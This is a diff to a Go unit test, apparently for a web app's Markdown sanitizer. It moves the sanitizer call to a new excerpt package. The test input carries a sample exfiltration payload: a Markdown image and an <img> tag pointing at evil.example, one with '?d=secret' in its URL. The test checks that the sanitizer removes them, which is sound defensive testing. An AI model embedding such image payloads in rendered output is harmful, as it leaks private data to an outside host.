@@ -5,6 +5,7 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/cheapseatsdev/cheapseats/internal/excerpt"
 	"github.com/cheapseatsdev/cheapseats/internal/store"
 )
 
@@ -38,7 +39,7 @@ func TestPagesRefuseFramesAndOutsideImages(t *testing.T) {
 // The analyst's Markdown keeps its formatting and links but loads no image: an image becomes its
 // alt text.
 func TestAnalystMarkdownDropsImages(t *testing.T) {
-	out := string(analystMarkdown("Read **this** ![the chart](https://evil.example/x.png?d=secret) and [the guide](https://example.com/g). <img src=https://evil.example/y.png>"))
+	out := string(excerpt.Block("Read **this** ![the chart](https://evil.example/x.png?d=secret) and [the guide](https://example.com/g). <img src=https://evil.example/y.png>"))
 	if strings.Contains(out, "<img") || strings.Contains(out, "evil.example") {
 		t.Errorf("an image survived: %s", out)
 	}
